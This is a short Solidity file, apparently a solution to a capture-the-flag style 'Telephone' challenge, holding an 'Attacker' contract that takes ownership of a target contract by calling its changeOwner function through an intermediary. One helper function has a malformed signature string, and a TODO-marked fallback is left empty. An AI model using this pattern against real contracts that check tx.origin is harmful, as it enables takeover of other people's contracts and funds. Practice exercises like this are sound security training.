pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

//import "hardhat/console.sol";
import "./Telephone.sol";

/**
 */
contract Attacker {
    
    function changeOwner(address _telephone, address _owner) public {  
        Telephone(_telephone).changeOwner(_owner);
    }
    
    //TODO: and do I need this? 
    function callChangeOwner(address _telephone, address _newOwner) public {
        _telephone.call(abi.encodeWithSignature("changeOwner(address, address)", _telephone, _newOwner));
    }
    
    //TODO: do I need this? 
    fallback() external {
        //console.log("FALLBACK");
        //_telephone.changeOwner(_owner);
    }
}